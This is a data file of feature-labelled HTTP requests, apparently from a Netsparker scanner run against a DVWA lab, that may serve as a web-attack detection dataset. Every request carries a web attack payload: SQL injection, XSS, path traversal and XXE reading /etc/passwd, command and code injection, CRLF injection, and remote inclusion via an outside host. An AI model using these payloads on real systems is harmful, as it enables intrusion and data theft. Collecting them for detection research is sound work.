111,2,200,763,14,55,17,4,1,GET /DVWA/vulnerabilities/view_help.php?id=%3c%3f%20print(int)0xFFF9999-22%3b%2f%2f%3f%3e&security=low HTTP/1.1
104,2,200,763,13,57,13,4,1,GET /DVWA/vulnerabilities/view_help.php?id=%3cscRipt%3ens(0x000588)%3c%2fscRipt%3e&security=low HTTP/1.1
111,2,200,763,14,60,15,4,1,GET /DVWA/vulnerabilities/view_help.php?id=%5bphp%5dprint(int)0xFFF9999-22%3b%5b%2fphp%5d&security=low HTTP/1.1
111,2,200,763,14,60,15,4,1,GET /DVWA/vulnerabilities/view_help.php?id=%7bphp%7dprint(int)0xFFF9999-22%3b%7b%2fphp%7d&security=low HTTP/1.1
110,2,200,763,33,39,18,4,0,GET /DVWA/vulnerabilities/view_help.php?id=((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))&security=low HTTP/1.1
94,2,200,763,11,51,16,4,0,GET /DVWA/vulnerabilities/view_help.php?id=((select%20sleep(25)))a--%201&security=low HTTP/1.1
337,2,200,763,128,62,69,4,1,GET /DVWA/vulnerabilities/view_help.php?id=(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a)&security=low HTTP/1.1
208,2,200,763,67,49,43,4,0,GET /DVWA/vulnerabilities/view_help.php?id=(SELECT%20CONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)))&security=low HTTP/1.1
143,2,200,763,35,46,27,4,0,GET /DVWA/vulnerabilities/view_help.php?id=-1%20AND%20((SELECT%201%20FROM%20(SELECT%202)a%20WHERE%201%3dsleep(25)))--%201&security=low HTTP/1.1
97,2,200,763,11,53,11,4,0,GET /DVWA/vulnerabilities/view_help.php?id=1%20ns%3dnetsparker(0x000578)%20&security=low HTTP/1.1
97,2,200,763,11,53,11,4,0,GET /DVWA/vulnerabilities/view_help.php?id=1%20ns%3dnetsparker(0x000579)%20&security=low HTTP/1.1
84,2,200,763,13,40,11,4,0,GET /DVWA/vulnerabilities/view_help.php?id=-1%20OR%2017-7%3d10&security=low HTTP/1.1
83,2,200,763,14,42,10,4,1,GET /DVWA/vulnerabilities/view_help.php?id=1%20OR%20X%3d%27ss&security=low HTTP/1.1
270,2,200,763,61,92,56,4,0,GET /DVWA/vulnerabilities/view_help.php?id=1%20procedure%20analyse(extractvalue(rand()%2cconcat(0x3a%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97))))%2c1)--%201&security=low HTTP/1.1
378,2,200,763,128,71,80,4,1,GET /DVWA/vulnerabilities/view_help.php?id=-1%22%20and%206%3d3%20or%201%3d1%2b(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a)%2b%22&security=low HTTP/1.1
351,2,200,763,128,64,74,4,1,GET /DVWA/vulnerabilities/view_help.php?id=-1%27%2b(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a)%2b%27&security=low HTTP/1.1
224,2,200,763,33,89,54,4,1,GET /DVWA/vulnerabilities/view_help.php?id=1%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x--&security=low HTTP/1.1
377,2,200,763,61,132,85,4,1,GET /DVWA/vulnerabilities/view_help.php?id=-1%5c%27%2b(select%201%20and%20row(1%2c1)%3e(select%20count(*)%2cconcat(CONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97))%2c0x3a%2cfloor(rand()*2))x%20from%20(select%201%20union%20select%202)a%20group%20by%20x%20limit%201))--%201&security=low HTTP/1.1
225,2,200,763,33,89,55,4,1,GET /DVWA/vulnerabilities/view_help.php?id=1)%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x--&security=low HTTP/1.1
107,2,200,763,23,41,17,4,1,GET /DVWA/vulnerabilities/view_help.php?id=1))%20WAITFOR%20DELAY%20%270%3a0%3a25%27--&security=low HTTP/1.1
226,2,200,763,33,89,56,4,1,GET /DVWA/vulnerabilities/view_help.php?id=1))%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x--&security=low HTTP/1.1
146,2,200,763,37,74,12,4,1,GET /DVWA/vulnerabilities/view_help.php?id=data%3a%3bbase64%2cJyI%2bPHNjcmlwdD5uZXRzcGFya2VyKDB4MDAwNTc0KTwvc2NyaXB0Pg%3d%3d&security=low HTTP/1.1
146,2,200,763,37,74,12,4,1,GET /DVWA/vulnerabilities/view_help.php?id=data%3a%3bbase64%2cJyI%2bPHNjcmlwdD5uZXRzcGFya2VyKDB4MDAwNTc1KTwvc2NyaXB0Pg%3d%3d&security=low HTTP/1.1
107,2,200,1250,11,45,18,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%22%26ping%20-c%2025%20127.0.0.1%20%26%22 HTTP/1.1
71,2,200,1250,11,40,7,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%2527 HTTP/1.1
101,2,200,1250,11,45,16,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%26ping%20-c%2025%20127.0.0.1%20%26 HTTP/1.1
69,2,200,1250,11,40,7,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%27 HTTP/1.1
107,2,200,1250,11,45,18,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%27%26ping%20-c%2025%20127.0.0.1%20%26%27 HTTP/1.1
184,2,200,1250,11,91,27,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%27%2b%20(select%20convert(int%2c%20cast(0x5f21403264696c656d6d61%20as%20varchar(8000)))%20from%20syscolumns)%20%2b%27 HTTP/1.1
163,2,200,1250,11,89,20,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=(select%20convert(int%2ccast(0x5f21403264696c656d6d61%20as%20varchar(8000)))%20from%20syscolumns) HTTP/1.1
81,2,200,1250,13,41,10,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=-1%20OR%201%3d1 HTTP/1.1
135,2,200,1250,11,69,16,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=convert(int%2c%20cast(0x5f21403264696c656d6d61%20as%20varchar(8000))) HTTP/1.1
98,2,200,1250,11,45,15,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=ping%20-c%2025%20127.0.0.1%20%26 HTTP/1.1
95,2,200,763,11,43,12,4,0,GET /DVWA/vulnerabilities/view_help.php?id=expr%20268409241%20-%202%20%26&security=low HTTP/1.1
99,2,200,763,11,56,14,4,0,GET /DVWA/vulnerabilities/view_help.php?id=http%3a%2f%2fr87.com%2fn%3f%00.php&security=low HTTP/1.1
98,2,200,763,11,61,9,4,1,GET /DVWA/vulnerabilities/view_help.php?id=javascript%3anetsparker(0x000586)&security=low HTTP/1.1
98,2,200,763,11,61,9,4,1,GET /DVWA/vulnerabilities/view_help.php?id=javascript%3anetsparker(0x000587)&security=low HTTP/1.1
70,2,200,763,16,39,6,4,0,GET /DVWA/vulnerabilities/view_help.php?id=NSFTW&security=low HTTP/1.1
87,2,200,763,14,48,9,4,0,GET /DVWA/vulnerabilities/view_help.php?id=print(int)0xFFF9999-22&security=low HTTP/1.1
249,2,200,763,38,100,57,4,1,GET /DVWA/vulnerabilities/view_help.php?id=syscolumns%20WHERE%202%3e3%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x--&security=low HTTP/1.1
95,1,200,762,15,43,17,8,1,GET /DVWA/dvwa/includes/?'\"@--></style></scRipt><scRipt>netsparker(0x00058A)</scRipt> HTTP/1.1
95,1,200,762,15,43,17,8,1,GET /DVWA/dvwa/includes/?'\"@--></style></scRipt><scRipt>netsparker(0x00058B)</scRipt> HTTP/1.1
96,2,200,763,11,58,9,4,0,GET /DVWA/vulnerabilities/view_help.php?id=%0ans%3anetsparker056650%3dvuln&security=low HTTP/1.1
99,2,200,763,11,59,10,4,0,GET /DVWA/vulnerabilities/view_help.php?id=%0d%0ans%3anetsparker056650%3dvuln&security=low HTTP/1.1
90,2,200,763,21,43,11,4,1,GET /DVWA/vulnerabilities/view_help.php?id=%22%7c%7cNETSPARKER%7c%7c&security=low HTTP/1.1
122,2,200,763,33,41,22,4,1,GET /DVWA/vulnerabilities/view_help.php?id=%27%2b((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))%2b%27&security=low HTTP/1.1
87,2,200,763,11,48,12,4,0,GET /DVWA/vulnerabilities/view_help.php?id=%2f%2f%2fr87.com%2f%3f&security=low HTTP/1.1
84,2,200,763,11,47,11,4,0,GET /DVWA/vulnerabilities/view_help.php?id=%2f%2fr87.com%2f%3f&security=low HTTP/1.1
84,2,200,763,11,47,11,4,0,GET /DVWA/vulnerabilities/view_help.php?id=%2f%5cr87.com%2f%3f&security=low HTTP/1.1
135,2,200,763,11,61,41,4,0,GET /DVWA/vulnerabilities/view_help.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&security=low HTTP/1.1
139,2,200,763,11,65,40,4,0,GET /DVWA/vulnerabilities/view_help.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fversion%00.php&security=low HTTP/1.1
132,2,200,763,11,62,38,4,0,GET /DVWA/vulnerabilities/view_help.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fversion&security=low HTTP/1.1
148,2,200,763,11,73,41,4,0,GET /DVWA/vulnerabilities/view_help.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar%2flog%2fapache%2ferror.log&security=low HTTP/1.1
149,2,200,763,11,73,41,4,0,GET /DVWA/vulnerabilities/view_help.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2ferror.log&security=low HTTP/1.1
122,2,200,763,11,53,22,4,1,GET /DVWA/vulnerabilities/view_help.php?id=%3c!--%23exec%20cmd%3d%22expr%20268409241%20-%202%22--%3e&security=low HTTP/1.1
104,2,200,763,13,57,13,4,1,GET /DVWA/vulnerabilities/view_help.php?id=%3cscRipt%3ens(0x000589)%3c%2fscRipt%3e&security=low HTTP/1.1
96,2,200,763,11,53,13,4,1,GET /DVWA/vulnerabilities/view_help.php?id=*%2fnetsparker(0x000590)%3b%2f*&security=low HTTP/1.1
124,2,200,763,33,42,22,4,0,GET /DVWA/vulnerabilities/view_help.php?id=-1%20or%201%3d((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))&security=low HTTP/1.1
133,2,200,763,33,43,25,4,1,GET /DVWA/vulnerabilities/view_help.php?id=-1%22%20or%201%3d((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))%2b%22&security=low HTTP/1.1
133,2,200,763,33,43,25,4,1,GET /DVWA/vulnerabilities/view_help.php?id=-1%27%20or%201%3d((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))%2b%27&security=low HTTP/1.1
111,2,200,763,12,68,13,4,0,GET /DVWA/vulnerabilities/view_help.php?id=body%7bx%3aexpression(netsparker(0x00058E))%7d&security=low HTTP/1.1
111,2,200,763,12,68,13,4,0,GET /DVWA/vulnerabilities/view_help.php?id=body%7bx%3aexpression(netsparker(0x00058F))%7d&security=low HTTP/1.1
97,2,200,1250,11,59,9,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%0ans%3anetsparker056650%3dvuln HTTP/1.1
100,2,200,1250,11,60,10,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%0d%0ans%3anetsparker056650%3dvuln HTTP/1.1
105,2,200,1250,11,44,15,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%22%26expr%20268409241%20-%202%20%26%22 HTTP/1.1
100,2,200,1250,14,51,13,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%22%2bprint(int)0xFFF9999-22%2b%22 HTTP/1.1
91,2,200,1250,21,44,11,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%22%7c%7cNETSPARKER%7c%7c HTTP/1.1
99,2,200,1250,11,44,13,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%26expr%20268409241%20-%202%20%26 HTTP/1.1
91,2,200,1250,13,41,13,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%27%20OR%20%271%27%3d%271 HTTP/1.1
93,2,200,1250,13,45,13,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%27%20OR%20%27ns%27%3d%27ns HTTP/1.1
108,2,200,1250,23,42,16,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%27%20WAITFOR%20DELAY%20%270%3a0%3a25%27-- HTTP/1.1
105,2,200,1250,11,44,15,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%27%26expr%20268409241%20-%202%20%26%27 HTTP/1.1
147,2,200,1250,11,71,20,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%27%2bconvert(int%2c%20cast(0x5f21403264696c656d6d61%20as%20varchar(8000)))%2b%27 HTTP/1.1
100,2,200,1250,14,51,13,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%27%2bprint(int)0xFFF9999-22%2b%27 HTTP/1.1
151,2,200,1250,14,62,21,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%27AND%201%3dcast(0x5f21403264696c656d6d61%20as%20varchar(8000))%20or%20%271%27%3d%27 HTTP/1.1
100,2,200,1250,14,53,13,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%2bprint(int)0xFFF9999-22%3b%2f%2f HTTP/1.1
123,2,200,1250,11,54,22,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%3c!--%23exec%20cmd%3d%22expr%20268409241%20-%202%22--%3e HTTP/1.1
112,2,200,1250,14,56,17,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%3c%3f%20print(int)0xFFF9999-22%3b%2f%2f%3f%3e HTTP/1.1
112,2,200,1250,14,61,15,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%7bphp%7dprint(int)0xFFF9999-22%3b%7b%2fphp%7d HTTP/1.1
89,2,200,1250,16,43,11,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=1%20AND%20%27NS%3d%27ss HTTP/1.1
362,2,200,1250,128,69,75,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=-1%20or%201%3d1%20and%20(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a) HTTP/1.1
85,2,200,1250,13,41,11,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=-1%20OR%2017-7%3d10 HTTP/1.1
84,2,200,1250,14,43,10,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=1%20OR%20X%3d%27ss HTTP/1.1
90,2,200,1250,11,44,10,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=expr%20268409241%20-%202 HTTP/1.1
96,2,200,1250,11,44,12,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=expr%20268409241%20-%202%20%26 HTTP/1.1
133,2,200,1250,11,79,17,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=http%3a%2f%2fexample.com%2f%3f%0d%0ans%3a%20netsparker056650%3dvuln HTTP/1.1
90,2,200,1250,13,51,11,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=hTTp%3a%2f%2fr87.com%2fn HTTP/1.1
100,2,200,1250,11,57,14,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=http%3a%2f%2fr87.com%2fn%3f%00.php HTTP/1.1
97,2,200,1250,11,57,13,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=http%3a%2f%2fr87.com%2fn%3f.php HTTP/1.1
108,3,200,1250,11,68,11,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=low&nsextt=%0ans%3anetsparker056650%3dvuln HTTP/1.1
111,3,200,1250,11,69,12,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=low&nsextt=%0d%0ans%3anetsparker056650%3dvuln HTTP/1.1
94,2,200,1250,11,58,8,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=ns%3anetsparker056650%3dvuln HTTP/1.1
71,2,200,1250,15,40,6,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=NS1NO HTTP/1.1
92,2,200,1250,11,45,13,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=ping%20-c%2025%20127.0.0.1 HTTP/1.1
88,2,200,1250,14,49,9,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=print(int)0xFFF9999-22 HTTP/1.1
89,2,200,763,11,43,10,4,0,GET /DVWA/vulnerabilities/view_help.php?id=expr%20268409241%20-%202&security=low HTTP/1.1
132,2,200,763,11,78,17,4,0,GET /DVWA/vulnerabilities/view_help.php?id=http%3a%2f%2fexample.com%2f%3f%0d%0ans%3a%20netsparker056650%3dvuln&security=low HTTP/1.1
91,2,200,763,11,52,12,4,0,GET /DVWA/vulnerabilities/view_help.php?id=http%3a%2f%2fr87.com%2f%3f&security=low HTTP/1.1
96,2,200,763,11,56,13,4,0,GET /DVWA/vulnerabilities/view_help.php?id=http%3a%2f%2fr87.com%2fn%3f.php&security=low HTTP/1.1
81,2,200,763,11,47,9,7,0,GET /DVWA/vulnerabilities/view_help.php?id=http://r87.com/?&security=low HTTP/1.1
109,2,200,763,12,66,13,4,1,GET /DVWA/vulnerabilities/view_help.php?id=n%3bns%3aexpression(netsparker(0x00058C))%3b&security=low HTTP/1.1
109,2,200,763,12,66,13,4,1,GET /DVWA/vulnerabilities/view_help.php?id=n%3bns%3aexpression(netsparker(0x00058D))%3b&security=low HTTP/1.1
93,2,200,763,11,57,8,4,0,GET /DVWA/vulnerabilities/view_help.php?id=ns%3anetsparker056650%3dvuln&security=low HTTP/1.1
134,2,200,763,11,79,20,4,0,GET /DVWA/vulnerabilities/view_help.php?id=php%3a%2f%2ffilter%2f%2fresource%3dhttp%3a%2f%2fr87.com%2fn%3f%00.php&security=low HTTP/1.1
78,2,200,763,11,45,9,4,0,GET /DVWA/vulnerabilities/view_help.php?id=r87.com%2f%3f&security=low HTTP/1.1
76,2,200,763,11,45,8,4,0,GET /DVWA/vulnerabilities/view_help.php?id=r87.com%2fn&security=low HTTP/1.1
161,2,200,763,24,48,41,4,0,GET /DVWA/vulnerabilities/view_help.php?id=%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd&security=low HTTP/1.1
97,2,200,763,11,52,12,4,1,GET /DVWA/vulnerabilities/view_help.php?id=%27%2bnetsparker(0x000592)%2b%27&security=low HTTP/1.1
97,2,200,763,11,52,12,4,1,GET /DVWA/vulnerabilities/view_help.php?id=%27%2bnetsparker(0x000593)%2b%27&security=low HTTP/1.1
138,2,200,763,11,61,42,4,0,GET /DVWA/vulnerabilities/view_help.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00&security=low HTTP/1.1
142,2,200,763,11,64,43,4,0,GET /DVWA/vulnerabilities/view_help.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00.php&security=low HTTP/1.1
80,2,200,763,11,50,8,4,0,GET /DVWA/vulnerabilities/view_help.php?id=%2fetc%2fpasswd&security=low HTTP/1.1
248,2,200,763,40,100,47,4,1,GET /DVWA/vulnerabilities/view_help.php?id=%3c%3fxml%20version%3d%221.0%22%3f%3e%3c!DOCTYPE%20ns%20%5b%3c!ELEMENT%20ns%20ANY%3e%3c!ENTITY%20lfi%20SYSTEM%20%22file%3a%2f%2f%2fetc%2fpasswd%22%3e%5d%3e%3cns%3e%26lfi%3b%3c%2fns%3e&security=low HTTP/1.1
133,2,200,763,11,73,21,4,1,GET /DVWA/vulnerabilities/view_help.php?id=%3ciframe%20src%3d%22http%3a%2f%2fr87.com%2f%3f%22%3e%3c%2fiframe%3e&security=low HTTP/1.1
96,2,200,763,11,53,13,4,1,GET /DVWA/vulnerabilities/view_help.php?id=*%2fnetsparker(0x000591)%3b%2f*&security=low HTTP/1.1
187,2,200,763,11,71,73,4,0,GET /DVWA/vulnerabilities/view_help.php?id=....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2fetc%2fpasswd&security=low HTTP/1.1
104,2,200,763,23,54,9,4,1,GET /DVWA/vulnerabilities/view_help.php?id=data%3a%3bbase64%2cTlM3NzU0NTYxNDQ2NTc1&security=low HTTP/1.1
139,2,200,763,11,65,41,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&security=low HTTP/1.1
109,2,200,1250,14,53,16,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%27%7b%24%7bprint(int)0xFFF9999-22%7d%7d%27 HTTP/1.1
79,2,200,1250,18,40,10,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security='%2BNSFTW%2B' HTTP/1.1
88,2,200,1250,11,49,12,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%2f%2f%2fr87.com%2f%3f HTTP/1.1
85,2,200,1250,11,48,11,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%2f%2fr87.com%2f%3f HTTP/1.1
85,2,200,1250,11,48,11,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%2f%5cr87.com%2f%3f HTTP/1.1
249,2,200,1250,40,101,47,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%3c%3fxml%20version%3d%221.0%22%3f%3e%3c!DOCTYPE%20ns%20%5b%3c!ELEMENT%20ns%20ANY%3e%3c!ENTITY%20lfi%20SYSTEM%20%22file%3a%2f%2f%2fetc%2fpasswd%22%3e%5d%3e%3cns%3e%26lfi%3b%3c%2fns%3e HTTP/1.1
134,2,200,1250,11,74,21,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%3ciframe%20src%3d%22http%3a%2f%2fr87.com%2f%3f%22%3e%3c%2fiframe%3e HTTP/1.1
112,2,200,1250,14,61,15,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%5bphp%5dprint(int)0xFFF9999-22%3b%5b%2fphp%5d HTTP/1.1
338,2,200,1249,128,63,69,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a) HTTP/1.1
209,2,200,1250,67,50,43,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=(SELECT%20CONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97))) HTTP/1.1
271,2,200,1250,61,93,56,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=1%20procedure%20analyse(extractvalue(rand()%2cconcat(0x3a%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97))))%2c1)--%201 HTTP/1.1
106,2,200,1250,23,42,15,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=1%20WAITFOR%20DELAY%20%270%3a0%3a25%27-- HTTP/1.1
379,2,200,1250,128,72,80,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=-1%22%20and%206%3d3%20or%201%3d1%2b(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a)%2b%22 HTTP/1.1
